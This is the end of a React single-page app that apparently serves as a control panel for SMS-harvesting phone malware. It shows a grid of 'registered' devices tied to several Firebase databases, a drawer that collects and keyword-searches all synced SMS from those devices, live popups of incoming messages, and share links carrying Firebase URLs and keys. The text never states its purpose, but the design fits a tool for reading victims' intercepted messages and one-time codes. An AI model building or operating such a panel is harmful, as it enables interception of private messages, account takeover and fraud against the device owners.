                <button onClick={() => setError('')} className="text-red-600 hover:text-red-400 flex-shrink-0"><Icon name="X" className="w-3.5 h-3.5" /></button>
              </div>
            )}

            {/* ══ DEVICE GRID ════════════════════════════════════ */}
            <main className="pb-10">
              {loading ? (
                <div className="dev-grid">
                  {Array.from({ length: 8 }).map((_, i) => (
                    <div key={i} className="skel">
                      <div className="flex items-start gap-3 mb-3">
                        <div className="w-10 h-10 rounded-xl surface2" />
                        <div className="flex-1 space-y-2"><div className="skel-bar w-3/4" /><div className="skel-bar w-1/2" /></div>
                      </div>
                      <div className="grid grid-cols-2 gap-3 mb-3"><div className="skel-bar h-4" /><div className="skel-bar h-4" /></div>
                      <div className="skel-bar h-8" />
                    </div>
                  ))}
                </div>
              ) : devices.length === 0 && Object.keys(serverErrors).length === 0 ? (
                <div className="flex flex-col items-center justify-center py-24 text-center">
                  <div className="w-16 h-16 rounded-2xl surface2 bd flex items-center justify-center mb-5">
                    <Icon name="Shield" className="w-8 h-8 tx4" />
                  </div>
                  <p className="text-base font-bold tx3">No devices connected</p>
                  <p className="text-sm tx4 mt-1.5 mb-5">Waiting for devices to register…</p>
                  <div className="flex items-center gap-2 px-4 py-2 rounded-full surface2 bd">
                    <div className="w-2 h-2 rounded-full bg-violet-500 animate-pulse" />
                    <span className="text-xs tx2">Auto-refreshing</span>
                  </div>
                </div>
              ) : filtered.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-20 text-center">
                  <Icon name="Search" className="w-10 h-10 tx4 mb-3" />
                  <p className="text-sm font-medium tx3">No devices match your filter</p>
                  <button onClick={() => { setFilter('all'); setSearch(''); }} className="mt-3 text-xs text-violet-400 hover:text-violet-300 transition-colors">Clear filters</button>
                </div>
              ) : (
                <>
                  <div className="dev-grid">
                    {visible.map((d, idx) => (
                      <DeviceCard key={d.key} device={d} onSelect={selectDevice}
                        fav={favSet.has(d.key)} onToggleFav={toggleFav} ci={idx} />
                    ))}
                  </div>
                  <div ref={sentinelRef} style={{ height: 1 }} />
                  {visible.length < filtered.length && (
                    <div className="text-center py-6 text-xs tx3">
                      Showing {visible.length} of {filtered.length} devices — scroll to load more
                    </div>
                  )}
                </>
              )}
            </main>
          </div>

          {/* ══ ALL SMS DRAWER ════════════════════════════════════ */}
          {showWorkers && (
            <>
              <div className="scrim" onClick={() => setShowWorkers(false)} />
              <div className="drawer">
                <div className="px-5 py-4 bd" style={{ borderBottomWidth: 1 }}>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-9 h-9 rounded-xl flex items-center justify-center" style={{ background: 'rgba(34,197,94,.15)', border: '1px solid rgba(34,197,94,.3)' }}>
                        <Icon name="MessageSquare" className="w-4 h-4 text-emerald-300" />
                      </div>
                      <div>
                        <h3 className="text-sm font-bold tx1">All SMS</h3>
                        <p className="text-[10px] tx2">
                          {allSms.length} messages · {servers.length} Firebase URL{servers.length !== 1 ? 's' : ''} · {stats.total} devices
                        </p>
                      </div>
                    </div>
                    <button onClick={() => setShowWorkers(false)} className="icon-btn" style={{ width: 38, height: 38 }}>
                      <Icon name="X" className="w-4 h-4" />
                    </button>
                  </div>

                  <div className="searchbox" style={{ height: 44, marginTop: 12, borderRadius: 14, padding: '0 14px' }}>
                    <Icon name="Search" className="w-4 h-4 tx3 flex-shrink-0" />
                    <input type="text" value={smsQuery} onChange={e => setSmsQuery(e.target.value)}
                      placeholder="Search keyword — e.g. swiggy" style={{ fontSize: 14 }} />
                    {smsQuery && (
                      <button onClick={() => setSmsQuery('')} className="tx3 hover:tx1 flex-shrink-0"><Icon name="X" className="w-3.5 h-3.5" /></button>
                    )}
                  </div>
                </div>

                <div className="flex-1 overflow-y-auto dscroll p-4 space-y-2">
                  {smsFiltered.length === 0 ? (
                    <div className="flex flex-col items-center justify-center py-20 text-center">
                      <Icon name="MessageSquare" className="w-9 h-9 tx4 mb-3" />
                      <p className="text-xs font-bold tx3">
                        {allSms.length === 0 ? 'No messages synced yet' : 'No message matches that keyword'}
                      </p>
                      <p className="text-[10px] tx4 mt-1">
                        {allSms.length === 0 ? 'Messages appear as devices sync…' : 'Try another keyword'}
                      </p>
                    </div>
                  ) : smsFiltered.slice(0, SMS_ROW_CAP).map(r => (
                    <SmsRow key={r.rid} r={r} onOpen={openSmsDevice} color={serverColors[r.device.serverId]} />
                  ))}
                  {smsFiltered.length > SMS_ROW_CAP && (
                    <p className="text-center text-[10px] tx4 pt-2">Showing first {SMS_ROW_CAP} of {smsFiltered.length}</p>
                  )}
                </div>

                <div className="p-4 bd" style={{ borderTopWidth: 1 }}>
                  <button onClick={() => { loadAllDevices(false); pumpSms(); showToast('Refreshing messages…'); }} className="btn-ghost">
                    <Icon name="RefreshCw" className="w-4 h-4" /> Refresh messages
                  </button>
                </div>
              </div>
            </>
          )}

          {/* ══ DEVICE PANEL ═════════════════════════════════════ */}
          {selectedDevice && selectedServer && (
            <DevicePanel device={selectedDevice} fbUrl={selectedServer.url} fbKey={selectedServer.key}
              onClose={closeDevice}
              onDelete={() => { closeDevice(); loadAllDevices(false); }}
              showToast={showToast} />
          )}

          {/* ══ LIVE SMS POPUP ═══════════════════════════════════ */}
          <SmsLivePopup
            msg={popupMsg}
            onDismiss={() => { if (popupTimerRef.current) clearTimeout(popupTimerRef.current); advancePopup.current(); }}
            onOpen={() => {
              if (popupMsg?.device) {
                selectDevice(popupMsg.device);
                if (popupTimerRef.current) clearTimeout(popupTimerRef.current);
                advancePopup.current();
              }
            }}
          />

          {/* ══ TOASTS ═══════════════════════════════════════════ */}
          {toasts.length > 0 && (
            <div className="toast-stack">
              {toasts.map(t => (
                <div key={t.id} className="toast">
                  <Icon name="CheckCircle" className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                  {t.text}
                </div>
              ))}
            </div>
          )}
        </div>
      );
    }

    /* ═══════════════════════════════════════════════════════════════
       STRUCTURAL SHARING — stable identity so memoized cards only
       re-render when their own data changed
       ═══════════════════════════════════════════════════════════════ */
    function mergeDevices(prevList, nextList) {
      if (prevList.length === 0) {
        return nextList.map(d => ({ ...d, _analysis: null, _msgCount: 0, _latest: null, _msgs: null }));
      }
      const prevMap = new Map();
      for (let i = 0; i < prevList.length; i++) prevMap.set(prevList[i].key, prevList[i]);
      const out = new Array(nextList.length);
      for (let i = 0; i < nextList.length; i++) {
        const nd = nextList[i];
        const pd = prevMap.get(nd.key);
        if (pd && pd.sig === nd.sig) out[i] = pd;
        else if (pd) out[i] = { ...nd, _analysis: pd._analysis, _msgCount: pd._msgCount, _latest: pd._latest, _msgs: pd._msgs };
        else out[i] = { ...nd, _analysis: null, _msgCount: 0, _latest: null, _msgs: null };
      }
      return out;
    }

    /* ═══════════════════════════════════════════════════════════════
       APP
       ═══════════════════════════════════════════════════════════════ */
    function App() {
      const [state, setState] = useState(() => isAdminLoggedIn() ? 'connect' : 'login');
      const [activeServers, setActiveServers] = useState([]);

      useEffect(() => {
        const params = new URLSearchParams(window.location.search);
        const sParam = params.get('s');
        if (sParam) {
          const parsed = parseShareLink(sParam);
          if (parsed && isAdminLoggedIn()) {
            const accounts = getAccounts();
            const existing = accounts.find(a => a.url === parsed.url);
            const server = existing || { id: Date.now(), name: 'Shared Server', url: parsed.url, key: parsed.key, date: new Date().toLocaleString(), color: '#8b5cf6' };
            setActiveServers([server]); setState('dashboard');
            window.history.replaceState(null, '', window.location.pathname);
            return;
          }
        }
        const msParam = params.get('ms');
        if (msParam) {
          const parsed = parseMultiShareLink(msParam);
          if (parsed && isAdminLoggedIn()) {
            const colors = ['#8b5cf6','#22d3ee','#ec4899','#f59e0b','#22c55e','#6366f1','#eab308','#f43f5e'];
            const servers = parsed.map((s, i) => ({ id: Date.now() + i, name: s.name || `Firebase Server ${i+1}`, url: s.url, key: s.key, date: new Date().toLocaleString(), color: colors[i % colors.length] }));
            setActiveServers(servers); setState('dashboard');
            window.history.replaceState(null, '', window.location.pathname);
            return;
          }
        }
        if (isAdminLoggedIn()) {
          const ids = getActiveServerIds();
          const accounts = getAccounts();
          if (ids.length > 0) {
            const prev = accounts.filter(a => ids.includes(a.id));
            if (prev.length > 0) { setActiveServers(prev); setState('dashboard'); }
          }
        }
      }, []);

      /* theme + glow + perf boot */
      useEffect(() => {
        const p = getPrefs();
        document.body.setAttribute('data-theme', p.theme || 'dark');
        document.body.classList.toggle('no-glow', !p.glow);
        document.body.classList.toggle('perf', !!p.perf);
      }, []);

      /* remove a dead firebase from both the active list and saved accounts */
      const removeServer = useCallback((id) => {
        setActiveServers(prev => {
          const next = prev.filter(s => s.id !== id);
          saveActiveServerIds(next.map(s => s.id));
          return next;
        });
        const accounts = getAccounts().filter(a => a.id !== id);
        saveAccounts(accounts);
        saveActiveServerIds(accounts.map(a => a.id));
      }, []);

      /* every server was auto-removed → fall back to the connect screen */
      useEffect(() => {
        if (state === 'dashboard' && activeServers.length === 0) setState('connect');
      }, [state, activeServers.length]);

      return (
        <div className="min-h-screen">
          {state === 'login' && <AdminLogin onLogin={() => setState('connect')} />}
          {state === 'connect' && <ConnectScreen onConnect={servers => { setActiveServers(servers); setState('dashboard'); }} />}
          {state === 'dashboard' && activeServers.length > 0 && (
            <Dashboard servers={activeServers}
              onLogout={() => { adminLogout(); setActiveServers([]); setState('login'); }}
              onBackToConnect={() => setState('connect')}
              onRemoveServer={removeServer} />
          )}
        </div>
      );
    }

    const root = ReactDOM.createRoot(document.getElementById('app'));
    root.render(<App />);
  </script>
</body>
</html>
